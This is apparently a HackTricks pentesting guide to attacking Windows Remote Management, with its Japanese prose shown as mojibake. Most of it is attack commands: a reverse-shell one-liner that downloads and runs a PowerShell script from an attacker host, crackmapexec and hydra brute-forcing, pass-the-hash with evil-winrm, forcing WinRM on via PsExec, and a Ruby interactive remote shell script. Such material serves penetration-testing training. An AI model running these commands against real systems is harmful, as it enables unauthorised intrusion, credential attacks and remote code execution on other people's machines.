# 5985,5986 - Pentesting WinRM

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to communicate with experienced hackers and bug bounty hunters!

**Hacking Insights**\
Engage with content that delves into the thrill and challenges of hacking

**Real-Time Hack News**\
Keep up-to-date with fast-paced hacking world through real-time news and insights

**Latest Announcements**\
Stay informed with the newest bug bounties launching and crucial platform updates

**Join us on** [**Discord**](https://discord.com/invite/N3FrSbmwdy) and start collaborating with top hackers today!

## WinRM

[Windows Remote Management (WinRM)](https://msdn.microsoft.com/en-us/library/windows/desktop/aa384426\(v=vs.85\).aspx) ã¯ã€**Microsoft ã«ã‚ˆã£ã¦å¼·èª¿ã•ã‚ŒãŸãƒ—ãƒ­ãƒˆã‚³ãƒ«**ã§ã€**HTTP(S) ã‚’ä»‹ã—ã¦ Windows ã‚·ã‚¹ãƒ†ãƒ ã®ãƒªãƒ¢ãƒ¼ãƒˆç®¡ç†ã‚’å¯èƒ½ã«ã—**ã€ãã®éç¨‹ã§ SOAP ã‚’æ´»ç”¨ã—ã¾ã™ã€‚ã“ã‚Œã¯åŸºæœ¬çš„ã« WMI ã«ã‚ˆã£ã¦å‹•ã‹ã•ã‚Œã€WMI æ“ä½œã®ãŸã‚ã® HTTP ãƒ™ãƒ¼ã‚¹ã®ã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹ã¨ã—ã¦è‡ªã‚‰ã‚’æç¤ºã—ã¾ã™ã€‚

WinRM ãŒãƒã‚·ãƒ³ã«å­˜åœ¨ã™ã‚‹ã“ã¨ã§ã€SSH ãŒä»–ã®ã‚ªãƒšãƒ¬ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã‚·ã‚¹ãƒ†ãƒ ã§æ©Ÿèƒ½ã™ã‚‹ã®ã¨åŒæ§˜ã«ã€PowerShell ã‚’ä»‹ã—ãŸç°¡å˜ãªãƒªãƒ¢ãƒ¼ãƒˆç®¡ç†ãŒå¯èƒ½ã«ãªã‚Šã¾ã™ã€‚WinRM ãŒå‹•ä½œã—ã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã™ã‚‹ã«ã¯ã€ç‰¹å®šã®ãƒãƒ¼ãƒˆãŒé–‹ã„ã¦ã„ã‚‹ã‹ã‚’ãƒã‚§ãƒƒã‚¯ã™ã‚‹ã“ã¨ãŒæ¨å¥¨ã•ã‚Œã¾ã™ï¼š

* **5985/tcp (HTTP)**
* **5986/tcp (HTTPS)**

ä¸Šè¨˜ã®ãƒªã‚¹ãƒˆã‹ã‚‰é–‹ã„ã¦ã„ã‚‹ãƒãƒ¼ãƒˆã¯ã€WinRM ãŒè¨­å®šã•ã‚Œã¦ã„ã‚‹ã“ã¨ã‚’ç¤ºã—ã€ãƒªãƒ¢ãƒ¼ãƒˆã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’é–‹å§‹ã™ã‚‹è©¦ã¿ã‚’è¨±å¯ã—ã¾ã™ã€‚

### **WinRM ã‚»ãƒƒã‚·ãƒ§ãƒ³ã®é–‹å§‹**

WinRM ã®ãŸã‚ã« PowerShell ã‚’æ§‹æˆã™ã‚‹ã«ã¯ã€Microsoft ã® `Enable-PSRemoting` cmdlet ãŒä½¿ç”¨ã•ã‚Œã€ãƒªãƒ¢ãƒ¼ãƒˆ PowerShell ã‚³ãƒãƒ³ãƒ‰ã‚’å—ã‘å…¥ã‚Œã‚‹ã‚ˆã†ã«ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ã‚’è¨­å®šã—ã¾ã™ã€‚æ˜‡æ ¼ã•ã‚ŒãŸ PowerShell ã‚¢ã‚¯ã‚»ã‚¹ã‚’æŒã¤ã“ã¨ã§ã€æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã—ã¦ã“ã®æ©Ÿèƒ½ã‚’æœ‰åŠ¹ã«ã—ã€ä»»æ„ã®ãƒ›ã‚¹ãƒˆã‚’ä¿¡é ¼æ¸ˆã¿ã¨ã—ã¦æŒ‡å®šã§ãã¾ã™ï¼š
```powershell
Enable-PSRemoting -Force
Set-Item wsman:\localhost\client\trustedhosts *
```
ã“ã®ã‚¢ãƒ—ãƒ­ãƒ¼ãƒã¯ã€`trustedhosts` è¨­å®šã«ãƒ¯ã‚¤ãƒ«ãƒ‰ã‚«ãƒ¼ãƒ‰ã‚’è¿½åŠ ã™ã‚‹ã“ã¨ã‚’å«ã¿ã¾ã™ã€‚ã“ã®ã‚¹ãƒ†ãƒƒãƒ—ã¯ã€ãã®å½±éŸ¿ã‚’è€ƒæ…®ã™ã‚‹å¿…è¦ãŒã‚ã‚‹ãŸã‚ã€æ…é‡ãªæ¤œè¨ãŒæ±‚ã‚ã‚‰ã‚Œã¾ã™ã€‚ã¾ãŸã€æ”»æ’ƒè€…ã®ãƒã‚·ãƒ³ã§ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¿ã‚¤ãƒ—ã‚’ã€ŒPublicã€ã‹ã‚‰ã€ŒWorkã€ã«å¤‰æ›´ã™ã‚‹å¿…è¦ãŒã‚ã‚‹ã“ã¨ã‚‚æŒ‡æ‘˜ã•ã‚Œã¦ã„ã¾ã™ã€‚

ã•ã‚‰ã«ã€WinRMã¯ `wmic` ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¦**ãƒªãƒ¢ãƒ¼ãƒˆã§**ã‚¢ã‚¯ãƒ†ã‚£ãƒ–åŒ–ã§ãã¾ã™ã€‚ä»¥ä¸‹ã«ç¤ºã—ã¾ã™:
```powershell
wmic /node:<REMOTE_HOST> process call create "powershell enable-psremoting -force"
```
ã“ã®æ–¹æ³•ã¯ã€WinRMã®ãƒªãƒ¢ãƒ¼ãƒˆè¨­å®šã‚’å¯èƒ½ã«ã—ã€é éš”ã‹ã‚‰Windowsãƒã‚·ãƒ³ã‚’ç®¡ç†ã™ã‚‹æŸ”è»Ÿæ€§ã‚’é«˜ã‚ã¾ã™ã€‚

### è¨­å®šã•ã‚Œã¦ã„ã‚‹ã‹ãƒ†ã‚¹ãƒˆã™ã‚‹

æ”»æ’ƒãƒã‚·ãƒ³ã®è¨­å®šã‚’ç¢ºèªã™ã‚‹ãŸã‚ã«ã€`Test-WSMan`ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ã€ã‚¿ãƒ¼ã‚²ãƒƒãƒˆãŒWinRMã‚’é©åˆ‡ã«è¨­å®šã—ã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¾ã™ã€‚ã“ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ã§ã€ãƒ—ãƒ­ãƒˆã‚³ãƒ«ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚„wsmidã«é–¢ã™ã‚‹è©³ç´°ãŒè¿”ã•ã‚Œã€è¨­å®šãŒæˆåŠŸã—ãŸã“ã¨ã‚’ç¤ºã—ã¾ã™ã€‚ä»¥ä¸‹ã¯ã€è¨­å®šã•ã‚ŒãŸã‚¿ãƒ¼ã‚²ãƒƒãƒˆã¨æœªè¨­å®šã®ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã®æœŸå¾…ã•ã‚Œã‚‹å‡ºåŠ›ã‚’ç¤ºã™ä¾‹ã§ã™ï¼š

* é©åˆ‡ã«è¨­å®šã•ã‚ŒãŸã‚¿ãƒ¼ã‚²ãƒƒãƒˆã®å ´åˆã€å‡ºåŠ›ã¯æ¬¡ã®ã‚ˆã†ã«ãªã‚Šã¾ã™ï¼š
```bash
Test-WSMan <target-ip>
```
å¿œç­”ã«ã¯ã€WinRMãŒæ­£ã—ãè¨­å®šã•ã‚Œã¦ã„ã‚‹ã“ã¨ã‚’ç¤ºã™ãƒ—ãƒ­ãƒˆã‚³ãƒ«ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã¨wsmidã«é–¢ã™ã‚‹æƒ…å ±ãŒå«ã¾ã‚Œã¦ã„ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

![](<../.gitbook/assets/image (582).png>)

* é€†ã«ã€WinRMã«å¯¾ã—ã¦**æ§‹æˆã•ã‚Œã¦ã„ãªã„**ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã®å ´åˆã€è©³ç´°ãªæƒ…å ±ã¯å¾—ã‚‰ã‚Œãšã€é©åˆ‡ãªWinRMè¨­å®šãŒãªã„ã“ã¨ãŒå¼·èª¿ã•ã‚Œã¾ã™ã€‚

![](<../.gitbook/assets/image (458).png>)

### ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹

ã‚¿ãƒ¼ã‚²ãƒƒãƒˆãƒã‚·ãƒ³ã§`ipconfig`ã‚’ãƒªãƒ¢ãƒ¼ãƒˆã§å®Ÿè¡Œã—ã€ãã®å‡ºåŠ›ã‚’è¡¨ç¤ºã™ã‚‹ã«ã¯ã€æ¬¡ã®ã‚ˆã†ã«ã—ã¾ã™ï¼š
```powershell
Invoke-Command -computername computer-name.domain.tld -ScriptBlock {ipconfig /all} [-credential DOMAIN\username]
```
![](<../.gitbook/assets/image (151).png>)

ç¾åœ¨ã®PSã‚³ãƒ³ã‚½ãƒ¼ãƒ«ã®ã‚³ãƒãƒ³ãƒ‰ã‚’**_**Invoke-Command**_ã‚’ä»‹ã—ã¦**å®Ÿè¡Œã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚ãƒ­ãƒ¼ã‚«ãƒ«ã«_**enumeration**_ã¨ã„ã†é–¢æ•°ãŒã‚ã‚Šã€**ãƒªãƒ¢ãƒ¼ãƒˆã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ã§å®Ÿè¡Œã—ãŸã„**å ´åˆã¯ã€æ¬¡ã®ã‚ˆã†ã«ã—ã¾ã™:
```powershell
Invoke-Command -ComputerName <computername> -ScriptBLock ${function:enumeration} [-ArgumentList "arguments"]
```
### ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’å®Ÿè¡Œã™ã‚‹
```powershell
Invoke-Command -ComputerName <computername> -FilePath C:\path\to\script\file [-credential CSCOU\jarrieta]
```
### ãƒªãƒãƒ¼ã‚¹ã‚·ã‚§ãƒ«ã‚’å–å¾—ã™ã‚‹
```powershell
Invoke-Command -ComputerName <computername> -ScriptBlock {cmd /c "powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10:8080/ipst.ps1')"}
```
### PSã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’å–å¾—ã™ã‚‹

ã‚¤ãƒ³ã‚¿ãƒ©ã‚¯ãƒ†ã‚£ãƒ–ãªPowerShellã‚·ã‚§ãƒ«ã‚’å–å¾—ã™ã‚‹ã«ã¯ã€`Enter-PSSession`ã‚’ä½¿ç”¨ã—ã¾ã™ï¼š
```powershell
#If you need to use different creds
$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
## Note the ".\" in the suername to indicate it's a local user (host domain)
$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

# Enter
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local [-Credential username]
## Bypass proxy
Enter-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
# Save session in var
$sess = New-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession $sess
## Background current PS session
Exit-PSSession # This will leave it in background if it's inside an env var (New-PSSession...)
```
![](<../.gitbook/assets/image (1009).png>)

**ã‚»ãƒƒã‚·ãƒ§ãƒ³ã¯ã€Œè¢«å®³è€…ã€ã®å†…éƒ¨ã§æ–°ã—ã„ãƒ—ãƒ­ã‚»ã‚¹ï¼ˆwsmprovhostï¼‰ã§å®Ÿè¡Œã•ã‚Œã¾ã™**

### **WinRMã‚’å¼·åˆ¶çš„ã«é–‹ã**

PSãƒªãƒ¢ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã¨WinRMã‚’ä½¿ç”¨ã™ã‚‹ãŸã‚ã«ã€ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ãŒæ§‹æˆã•ã‚Œã¦ã„ãªã„å ´åˆã¯ã€æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã§æœ‰åŠ¹ã«ã§ãã¾ã™ï¼š
```powershell
.\PsExec.exe \\computername -u domain\username -p password -h -d powershell.exe "enable-psremoting -force"
```
### ã‚»ãƒƒã‚·ãƒ§ãƒ³ã®ä¿å­˜ã¨å¾©å…ƒ

ã“ã‚Œã¯ã€ãƒªãƒ¢ãƒ¼ãƒˆã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ã§**è¨€èª**ãŒ**åˆ¶ç´„**ã•ã‚Œã¦ã„ã‚‹å ´åˆã€**æ©Ÿèƒ½ã—ã¾ã›ã‚“**ã€‚
```powershell
#If you need to use different creds
$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
## Note the ".\" in the suername to indicate it's a local user (host domain)
$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

#You can save a session inside a variable
$sess1 = New-PSSession -ComputerName <computername> [-SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)]
#And restore it at any moment doing
Enter-PSSession -Session $sess1
```
ã“ã®ã‚»ãƒƒã‚·ãƒ§ãƒ³å†…ã§ã¯ã€_Invoke-Command_ ã‚’ä½¿ç”¨ã—ã¦ PS ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’ãƒ­ãƒ¼ãƒ‰ã§ãã¾ã™ã€‚
```powershell
Invoke-Command -FilePath C:\Path\to\script.ps1 -Session $sess1
```
### ã‚¨ãƒ©ãƒ¼

æ¬¡ã®ã‚¨ãƒ©ãƒ¼ãŒè¡¨ç¤ºã•ã‚ŒãŸå ´åˆï¼š

`enter-pssession : Connecting to remote server 10.10.10.175 failed with the following error message : The WinRM client cannot process the request. If the authentication scheme is different from Kerberos, or if the client computer is not joined to a domain, then HTTPS transport must be used or the destination machine must be added to the TrustedHosts configuration setting. Use winrm.cmd to configure TrustedHosts. Note that computers in the TrustedHosts list might not be authenticated. You can get more information about that by running the following command: winrm help config. For more information, see the about_Remote_Troubleshooting Help topic.`

ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã§è©¦ã—ã¦ã¿ã¦ãã ã•ã„ï¼ˆ[ã“ã¡ã‚‰](https://serverfault.com/questions/657918/remote-ps-session-fails-on-non-domain-server)ã‹ã‚‰ã®æƒ…å ±ï¼‰ï¼š
```ruby
winrm quickconfig
winrm set winrm/config/client '@{TrustedHosts="Computer1,Computer2"}'
```
<figure><img src="../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) ã‚µãƒ¼ãƒãƒ¼ã«å‚åŠ ã—ã¦ã€çµŒé¨“è±Šå¯Œãªãƒãƒƒã‚«ãƒ¼ã‚„ãƒã‚°ãƒã‚¦ãƒ³ãƒ†ã‚£ãƒãƒ³ã‚¿ãƒ¼ã¨ã‚³ãƒŸãƒ¥ãƒ‹ã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’å–ã‚Šã¾ã—ã‚‡ã†ï¼

**ãƒãƒƒã‚­ãƒ³ã‚°ã®æ´å¯Ÿ**\
ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚¹ãƒªãƒ«ã¨èª²é¡Œã«æ·±ãæ˜ã‚Šä¸‹ã’ãŸã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã«å‚åŠ ã—ã¾ã—ã‚‡ã†

**ãƒªã‚¢ãƒ«ã‚¿ã‚¤ãƒ ãƒãƒƒã‚¯ãƒ‹ãƒ¥ãƒ¼ã‚¹**\
ãƒªã‚¢ãƒ«ã‚¿ã‚¤ãƒ ã®ãƒ‹ãƒ¥ãƒ¼ã‚¹ã¨æ´å¯Ÿã‚’é€šã˜ã¦ã€æ€¥é€Ÿã«å¤‰åŒ–ã™ã‚‹ãƒãƒƒã‚­ãƒ³ã‚°ã®ä¸–ç•Œã«é…ã‚Œãšã«ã¤ã„ã¦ã„ãã¾ã—ã‚‡ã†

**æœ€æ–°ã®ãŠçŸ¥ã‚‰ã›**\
æ–°ã—ã„ãƒã‚°ãƒã‚¦ãƒ³ãƒ†ã‚£ã®é–‹å§‹ã‚„é‡è¦ãªãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã®æ›´æ–°ã«ã¤ã„ã¦æƒ…å ±ã‚’å¾—ã¾ã—ã‚‡ã†

[**Discord**](https://discord.com/invite/N3FrSbmwdy) ã«å‚åŠ ã—ã¦ã€ä»Šæ—¥ã‹ã‚‰ãƒˆãƒƒãƒ—ãƒãƒƒã‚«ãƒ¼ã¨ã‚³ãƒ©ãƒœãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ã‚’å§‹ã‚ã¾ã—ã‚‡ã†ï¼

## Linuxã§ã®WinRMæ¥ç¶š

### ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹

æ³¨æ„ã—ã¦ãã ã•ã„ã€‚winrmã®ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã¯ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ãƒ–ãƒ­ãƒƒã‚¯ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚
```ruby
#Brute force
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt

#Just check a pair of credentials
# Username + Password + CMD command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -p <password> -x "whoami"
# Username + Hash + PS command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -H <HASH> -X '$PSVersionTable'
#Crackmapexec won't give you an interactive shell, but it will check if the creds are valid to access winrm
```
### evil-winrmã®ä½¿ç”¨
```ruby
gem install evil-winrm
```
**ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆ**ã‚’GitHubã§èª­ã‚€: [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)
```ruby
evil-winrm -u Administrator -p 'EverybodyWantsToWorkAtP.O.O.'  -i <IP>/<Domain>
```
**evil-winrm**ã‚’ä½¿ç”¨ã—ã¦**IPv6ã‚¢ãƒ‰ãƒ¬ã‚¹**ã«æ¥ç¶šã™ã‚‹ã«ã¯ã€_**/etc/hosts**_å†…ã«ã‚¨ãƒ³ãƒˆãƒªã‚’ä½œæˆã—ã€**ãƒ‰ãƒ¡ã‚¤ãƒ³å**ã‚’IPv6ã‚¢ãƒ‰ãƒ¬ã‚¹ã«è¨­å®šã—ã¦ã€ãã®ãƒ‰ãƒ¡ã‚¤ãƒ³ã«æ¥ç¶šã—ã¾ã™ã€‚

### evil-winrmã§ãƒãƒƒã‚·ãƒ¥ã‚’æ¸¡ã™
```ruby
evil-winrm -u <username> -H <Hash> -i <IP>
```
![](<../.gitbook/assets/image (680).png>)

### PS-docker ãƒã‚·ãƒ³ã®ä½¿ç”¨
```
docker run -it quickbreach/powershell-ntlm
$creds = Get-Credential
Enter-PSSession -ComputerName 10.10.10.149 -Authentication Negotiate -Credential $creds
```
### Rubyã‚¹ã‚¯ãƒªãƒ—ãƒˆã®ä½¿ç”¨

**ã‚³ãƒ¼ãƒ‰ã¯ã“ã“ã‹ã‚‰æŠ½å‡ºã•ã‚Œã¾ã—ãŸ:** [**https://alamot.github.io/winrm\_shell/**](https://alamot.github.io/winrm\_shell/)
```ruby
require 'winrm-fs'

# Author: Alamot
# To upload a file type: UPLOAD local_path remote_path
# e.g.: PS> UPLOAD myfile.txt C:\temp\myfile.txt
# https://alamot.github.io/winrm_shell/


conn = WinRM::Connection.new(
endpoint: 'https://IP:PORT/wsman',
transport: :ssl,
user: 'username',
password: 'password',
:no_ssl_peer_verification => true
)


class String
def tokenize
self.
split(/\s(?=(?:[^'"]|'[^']*'|"[^"]*")*$)/).
select {|s| not s.empty? }.
map {|s| s.gsub(/(^ +)|( +$)|(^["']+)|(["']+$)/,'')}
end
end


command=""
file_manager = WinRM::FS::FileManager.new(conn)


conn.shell(:powershell) do |shell|
until command == "exit\n" do
output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
print(output.output.chomp)
command = gets
if command.start_with?('UPLOAD') then
upload_command = command.tokenize
print("Uploading " + upload_command[1] + " to " + upload_command[2])
file_manager.upload(upload_command[1], upload_command[2]) do |bytes_copied, total_bytes, local_path, remote_path|
puts("#{bytes_copied} bytes of #{total_bytes} bytes copied")
end
command = "echo `nOK`n"
end
output = shell.run(command) do |stdout, stderr|
STDOUT.print(stdout)
STDERR.print(stderr)
end
end
puts("Exiting with code #{output.exitcode}")
end
```
## Shodan

* `port:5985 Microsoft-HTTPAPI`

## References

* [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)

## HackTricks è‡ªå‹•ã‚³ãƒãƒ³ãƒ‰
```
Protocol_Name: WinRM    #Protocol Abbreviation if there is one.
Port_Number:  5985     #Comma separated if there is more than one.
Protocol_Description: Windows Remote Managment        #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for WinRM
Note: |
Windows Remote Management (WinRM) is a Microsoft protocol that allows remote management of Windows machines over HTTP(S) using SOAP. On the backend it's utilising WMI, so you can think of it as an HTTP based API for WMI.

sudo gem install winrm winrm-fs colorize stringio
git clone https://github.com/Hackplayers/evil-winrm.git
cd evil-winrm
ruby evil-winrm.rb -i 192.168.1.100 -u Administrator -p â€˜MySuperSecr3tPass123!â€™

https://kalilinuxtutorials.com/evil-winrm-hacking-pentesting/

ruby evil-winrm.rb -i 10.10.10.169 -u melanie -p 'Welcome123!' -e /root/Desktop/Machines/HTB/Resolute/
^^so you can upload binary's from that directory        or -s to upload scripts (sherlock)
menu
invoke-binary `tab`

#python3
import winrm
s = winrm.Session('windows-host.example.com', auth=('john.smith', 'secret'))
print(s.run_cmd('ipconfig'))
print(s.run_ps('ipconfig'))

https://book.hacktricks.xyz/pentesting/pentesting-winrm

Entry_2:
Name: Hydra Brute Force
Description: Need User
Command: hydra -t 1 -V -f -l {Username} -P {Big_Passwordlist} rdp://{IP}
```
<figure><img src="../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

çµŒé¨“è±Šå¯Œãªãƒãƒƒã‚«ãƒ¼ã‚„ãƒã‚°ãƒã‚¦ãƒ³ãƒ†ã‚£ãƒãƒ³ã‚¿ãƒ¼ã¨ã‚³ãƒŸãƒ¥ãƒ‹ã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’å–ã‚‹ãŸã‚ã«ã€[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy)ã‚µãƒ¼ãƒãƒ¼ã«å‚åŠ ã—ã¾ã—ã‚‡ã†ï¼

**ãƒãƒƒã‚­ãƒ³ã‚°ã®æ´å¯Ÿ**\
ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚¹ãƒªãƒ«ã¨èª²é¡Œã«æ·±ãæ˜ã‚Šä¸‹ã’ãŸã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã«å‚åŠ ã—ã¾ã—ã‚‡ã†

**ãƒªã‚¢ãƒ«ã‚¿ã‚¤ãƒ ãƒãƒƒã‚¯ãƒ‹ãƒ¥ãƒ¼ã‚¹**\
ãƒªã‚¢ãƒ«ã‚¿ã‚¤ãƒ ã®ãƒ‹ãƒ¥ãƒ¼ã‚¹ã¨æ´å¯Ÿã‚’é€šã˜ã¦ã€æ€¥é€Ÿã«å¤‰åŒ–ã™ã‚‹ãƒãƒƒã‚­ãƒ³ã‚°ã®ä¸–ç•Œã«é…ã‚Œãšã«ã¤ã„ã¦ã„ãã¾ã—ã‚‡ã†

**æœ€æ–°ã®ãŠçŸ¥ã‚‰ã›**\
æ–°ã—ã„ãƒã‚°ãƒã‚¦ãƒ³ãƒ†ã‚£ã®é–‹å§‹ã‚„é‡è¦ãªãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã®æ›´æ–°ã«ã¤ã„ã¦æƒ…å ±ã‚’å¾—ã¾ã—ã‚‡ã†

ä»Šæ—¥ã€[**Discord**](https://discord.com/invite/N3FrSbmwdy)ã«å‚åŠ ã—ã¦ã€ãƒˆãƒƒãƒ—ãƒãƒƒã‚«ãƒ¼ã¨ã‚³ãƒ©ãƒœãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ã‚’å§‹ã‚ã¾ã—ã‚‡ã†ï¼

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* [**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã—ã¦ãã ã•ã„ã€‚

</details>
{% endhint %}
